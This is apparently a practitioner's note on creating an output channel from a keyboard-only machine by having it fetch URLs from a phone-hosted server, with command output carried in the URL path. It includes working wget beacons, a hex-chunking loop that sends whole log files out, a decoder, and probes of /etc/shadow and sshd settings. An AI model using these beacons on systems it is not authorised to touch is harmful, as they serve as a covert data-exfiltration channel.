# The Beacon Output Channel (one-way stdout from a keyboard-only target)

When you can only *type* into a machine, you have no stdout. Give it one: have the target make an HTTP request to the phone and read the phone's server log. The request's presence proves the command ran; the **URL path carries the payload**.

## Server side (phone)

- Plain `python3 -m http.server` serving a small drop directory is enough. Use a low port for short URLs (`http://<phone-ip>/r`).
- Binding port 80 needs root, and `su` has no Termux `PATH` and a different `$HOME`: start it with the absolute interpreter path and an absolute drop dir baked into the script, e.g. `su -c "cd /data/data/com.termux/files/home && nohup /data/data/com.termux/files/usr/bin/python3 /data/data/com.termux/files/home/serve80.py >/dev/null 2>&1 &"`. `os.path.expanduser('~')` under root resolves elsewhere — hardcode paths.
- Requests to paths that do not exist return 404 and that is fine: read the **request line**, not the status.
- Confirm the server is alive before blaming the target: `curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1:<port>/<file>`.

## Target side

- `wget -qO- http://<phone-ip>/<tag>-<payload>` (or `curl -fsSL`). Prefer `wget`: it is present on Debian where `curl` often is not.
- Single-value diagnostics inline your command substitution into the path:
  `wget -qO- http://<phone-ip>/st-$(systemctl is-active NetworkManager)-$(systemctl is-active gdm)-$(systemctl get-default)`
- **Never put a space or `#` in the path.** The shell splits on the space, so `wget` fetches only the first word — a beacon silently loses its tail. Map spaces out (`tr ' /' '__'`) or avoid them entirely.
- When piping a typed command through `su -c "..."`, escape as `\$(...)` so the substitution happens on the *target*, not on the phone.

## Bulk payloads: hex chunks

```sh
h=$(od -An -v -tx1 "$LOG" | tr -d ' \n')
i=1000
while [ -n "$h" ]; do
  c=$(printf %s "$h" | cut -c1-120)
  h=$(printf %s "$h" | cut -c121-)
  wget -qO- "http://<phone-ip>/H$i-$c" >/dev/null 2>&1
  i=$((i+1))
  [ "$i" -gt 1600 ] && break
done
wget -qO- "http://<phone-ip>/HEND-$i" >/dev/null 2>&1
```

- Hex is `[0-9a-f]`, so it needs no mapping and survives URLs untouched. Do **not** use base64 with a `+/=` → `xyz` substitution: base64 already contains those letters, and the collision corrupts the stream from the first occurrence onward.
- Use a fresh index range for each successive run (1000+, 2000+), so a second exfil never overwrites the first.
- **The `break` cap truncates silently.** After reassembling, assert the length (base64 must be a multiple of 4; hex must be even) and fetch the remainder with `cut -c<N>-` from a second script rather than resending everything.

## Decode locally

```python
import re, os
lines = open(os.path.expanduser("~/serve80.log"), errors="replace").read().splitlines()
H = {}
for ln in lines:
    m = re.search(r'GET /H(\d+)-([0-9a-f]+)', ln)
    if m: H[int(m.group(1))] = m.group(2)
blob = "".join(H[k] for k in sorted(H))          # numeric sort, not lexicographic
open("out.log", "wb").write(bytes.fromhex(blob))
```

- **Last chunk wins** when an index repeats — keep a payload→index dict and note duplicates if the join fails a sanity check.
- A log written with `set -x` is 90% noise: filter lines starting with `+ ` to read the actual command output.

## Useful diagnostic beacons (target answers about itself)

| Goal | Beacon path fragment |
|------|----------------------|
| Is the shell alive / who am I | `alive-$(id -un)-$(hostname)` |
| Did my file write land, byte-exact | `$(sha256sum /path/file\|cut -c1-16)` plus `$(wc -c </path/file)` |
| Account usable? | `$(grep -c "^user:!" /etc/shadow)` (locked) |
| Effective sshd policy | `sshd -T>/tmp/t` then `$(grep -c "^allowusers" /tmp/t)` etc. |
| Component states | `$(systemctl is-active A)-$(systemctl is-active B)` |
